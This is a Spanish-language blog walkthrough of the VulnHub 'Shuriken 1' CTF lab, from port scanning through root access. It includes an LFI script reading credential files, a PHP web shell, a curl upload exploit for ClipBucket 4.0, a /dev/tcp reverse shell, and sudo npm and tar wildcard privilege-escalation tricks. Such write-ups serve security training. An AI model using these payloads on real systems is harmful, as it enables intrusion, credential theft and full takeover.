---
layout: single
title: Shuriken 1 - VulnHub
excerpt: " Difficulty: easy/medium... Keep in mind it's still just a CTF. It's meant to be rather easy. Can you take advantage of the misconfigurations made by The Shuriken Company? See you in the root. "
date: 2023-03-14
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-shuriken/Shuriken1.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - LFI
  - Apache
  - Bash
  - Scripting
  - sudoers
  - ClipBucket
  - JavaScript
---

Keep in mind it's still just a CTF. It's meant to be rather easy. Can you take advantage of the misconfigurations made by The Shuriken Company? See you in the root.
<br><br>
# Summary
- IP: 192.168.1.49
- Ports: 80
- OS: Linux
- Services & Applications:
	-  80 -> Apache httpd 2.4.29

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.49 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p80 -sCV 192.168.1.49 -oN targeted
```


# Análisis de página web (Port 80):

- Al entrar a la página principal vemos una página empresarial común; hacemos una búsqueda de directorios con `gobuster`:

```bash
$gobuster dir -u 192.168.1.49 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

```js
===============================================================
2023/03/14 15:46:05 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.49/css/]
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.49/img/]
/index.php            (Status: 200) [Size: 6021]                              
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.49/js/] 
/secret               (Status: 301) [Size: 313] [--> http://192.168.1.49/secret/]
/server-status        (Status: 403) [Size: 277]                                  
/.htpasswd            (Status: 403) [Size: 277]                                  
/.hta                 (Status: 403) [Size: 277]                                  
/.htaccess            (Status: 403) [Size: 277]     
```

- Revisamos el contenido del directorio "/secret" y vemos una imagen, la abrimos y solo se muestra el logo de `JavaScript`, como se trata de una CTF podría tratarse de una pista.

- Analizamos el directorio "/js" y vemos que contiene dos archivos JavaScript, leemos el primero y en su contenido encontramos un subdominio `"http://broadcast.shuriken.local"`, lo agregamos al "/etc/hosts" con su respectivo dominio.

- Entramos al subdominio "broadcast.shuriken.local" y nos pidre `credenciales`, por el momento no contamos con ninguna así que seguimos enumerando.

- Si entramos el dominio "shuriken.local" nos muestra la página principal que vimos al inicio.

- Leemos el segundo archivo JavaScript del directorio "/js" y en su contenido encontramos el siguiente enlace: `"http://shuriken.local/index.php?referer="`
<br><br>
# LFI + Bash Scripting:

- Se trata del index de la página principal pero está apuntando a un parámetro, sospechamos de un `LFI` e intentamos acceder al archivo "/etc/passwd"

```
http://shuriken.local/index.php?referer=/etc/passwd
```

- Dentro del código fuente podremos confirmar que efectivamente es vulnerable; para hacer más cómodo este LFI nos crearemos una `script` en bash:

```bash
#!/bin/bash

if [ $# -ne 1 ]; then
  echo "Uso: $0 Archivo"
  exit 1
fi

file=$1

target="http://shuriken.local/index.php?referer=$file"

content=$(curl -s "$target" | sed -n '136,$p' | sed -n '/<script/q;p')

echo "$content"
```


- Ahora usamos el LFI para buscar archivos del sistema que puedan contener credenciales para probarlas en la ventana de Login que nos despliega el subdominio "broadcast.shuriken.local".

- Revisamos archivos de configuración de `apache`:

```bash
$./exploitLFI.sh /etc/apache2/ports.conf
```

- Este archivo nos muestra otro:

```bash
$./exploitLFI.sh /etc/apache2/sites-enabled/000-default.conf
```

- Y este archivo nos muestra otro en el que posiblemente hayan credenciales:

```bash
$./exploitLFI.sh /etc/apache2/.htpasswd
```

```js
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

- Encontramos un usuario con su `hash`, lo crackeamos con John:

```bash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
```

- Obtenemos la contraseña para el usuario "developers" y la usamos para entrar en el login que nos desplegaba al entrar en el subdominio "broadcast.shuriken.local".

<br><br>
# ClipBucket v4.0 Arbitrary File Upload (Authenticated):  

- Al entrar podemos ver que se trata de aplicación web denominada `"ClipBucket v4.0"`, buscamos vulnerabilidades para esta aplicación web.

```bash
$searchsploit clipbucket 4.0
$searchsploit -x php/webapps/44250.txt
```

- Podemos encontrar un `Arbitrary File Upload` el cual se lo puede efectuar tanto autenticado como desautenticado, en este caso lo haremos de la segunda manera ya que hemos ganado acceso y podemos usar la autorización que tenemos como el usuario developer.

- Para obtener dicha autorización, recargamos la página interceptando la petición con Burpsuite y en el header podemos ver la linea:

```Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==```

(Podemos notar que el usuario y la contraseña están codificadas en base64).

- Con la autorización ubicada, ahora procedemos a crear un archivo `"pwned.php"` el cual usaremos para ejecutar comandos del sistema víctima:

```php
<?php echo passthru($_GET['cmd']); ?>
```

- Con todo esto, en el mismo directorio donde creamos el archivo php hacemos la petición con curl para subir este archivo aprovechando la vulnerabilidad que habíamos encontrado:


```bash
$curl -H "Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==" -F "file=@pwned.php" -F "plupload=1" -F "name=anyname.php" "http://broadcast.shuriken.local/actions/beats_uploader.php"
```

```js
creating file{"success":"yes","file_name":"167881087548cc5d","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```


- Como vemos, el archivo se subió correctamente con el nombre "167881087548cc5d.php" en el directorio "CB_BEATS_UPLOAD_DIR", así que accedemos a este para comprobar que podamos ejecutar comandos:


```
http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/167881087548cc5d.php?cmd=whoami
```

- Confirmamos el `RCE` y ahora simplemente entablamos una reverse shell:

```
http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/167881087548cc5d.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.35/443 0>%261"
```

- Habremos accedido al sistema como el usuario `"www-data"`


<br><br>
# ESCALANDO PRIVILEGIOS:

- Si vemos permisos de `sudoers` podemos encontrar lo siguiente:

```js
User www-data may run the following commands on shuriken:
    (server-management) NOPASSWD: /usr/bin/npm
```
- Es decir, podemos ejecutar el binario `"npm"` como el usuario "server-management" sin contraseña; buscamos en `gtfobins` una forma de escalar privilegios usando dicho binario y encontramos esto [npm | GTFOBins](https://gtfobins.github.io/gtfobins/npm/#sudo)

- Ejecutamos los comandos:

```bash
$TF=$(mktemp -d)
$echo '{"scripts": {"preinstall": "/bin/bash"}}' > $TF/package.json
```

- Le damos permisos a la ruta en la que se ejecuta la variable que hemos accedido para que cualquier usuario pueda acceder a esta:

```
$echo $TF
```

```js
/tmp/tmp.qx2ih7BUEK
```

```bash
$chmod 777 /tmp/tmp.qx2ih7BUEK
```

- Y por último ejecutamos como el usuario "server-management" el binario npm:

```bash
$sudo -u server-management npm -C $TF --unsafe-perm i
```

- Habremos pivotado al usuario `"server-management"`.

- Ejecutamos el binario de [pspy](https://github.com/DominicBreuker/pspy/releases) para escanear procesos que se ejecuten en segundo plano de forma automática y después de unos minutos vemos lo siguiente:

### Nota: Al no funcionar wget usamos curl para transferir el binario de pspy:

```bash
$curl "192.168.1.35/pspy64" -o pspy64
$chmod +x pspy64
$./pspy64
```


```js
2023/03/14 17:34:01 CMD: UID=0     PID=2068   | /bin/sh -c /var/opt/backupsrv.sh 
2023/03/14 17:34:01 CMD: UID=0     PID=2067   | /usr/sbin/CRON -f 
2023/03/14 17:34:01 CMD: UID=0     PID=2072   | date 
2023/03/14 17:34:01 CMD: UID=0     PID=2073   | tar czf /var/backups/shuriken-Tuesday.tgz Daily Job Progress Report Format.pdf Employee Search Progress Report.pdf 
2023/03/14 17:34:01 CMD: UID=0     PID=2076   | /bin/bash /var/opt/backupsrv.sh 
2023/03/14 17:34:01 CMD: UID=0     PID=2077   | ls -lh /var/backups 
```

- Se está ejecutando una script en bash como root cada cierto tiempo; la analizamos para ver en qué consiste:

```bash
$cat /var/opt/backupsrv.sh
```

```bash
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```


- Podemos ver que en una linea ejecuta el comando `"tar"` seguido del comodín o wildcard `"*"` apuntando a todo el contenido que hay dentro del directorio /home/server-management/Documents/.

- Podemos aprovecharnos de este comodín para que el comando tar ejecute lo que nosotros queramos, si buscamos en gtfobins maneras de obtener una shell con tar vemos lo siguiente [tar | GTFOBins](https://gtfobins.github.io/gtfobins/tar/#shell)

```bash
$tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- Entonces, ya que se está haciendo uso del comodín `"*"` en el directorio anteriormente mencionado, lo que haremos es crear en ese directorio archivos con el nombre de las flags que necesita el comando tar para que, en este caso, ejecute un archivo llamado `"pwned"` el cual tendrá como contenido un comando que otorgará permisos SUID a la bash:

```bash
$nano pwned
```

```js
#!/bin/bash
chmod u+s /bin/bash
```


```bash
$touch -- --checkpoint=1 
$touch -- --checkpoint-action=exec='bash pwned'
```

- Y ahora simplemente esperaremos a que la script `"backupsrv.sh"` se ejecute como root y el comando tar efectúe lo que nosotros hemos inyectado y que la bash obtenga permisos SUID:

```bash
$watch ls -l /bin/bash
```

```js
Every 2.0s: ls -l /bin/bash                                                                                                                                 shuriken: Tue Mar 14 17:56:12 2023

-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```

- Al otorgarse los permisos `SUID` lo que resta por hacer es ejecutar la bash con privilegios y seremos root:

```bash
$bash -p
```

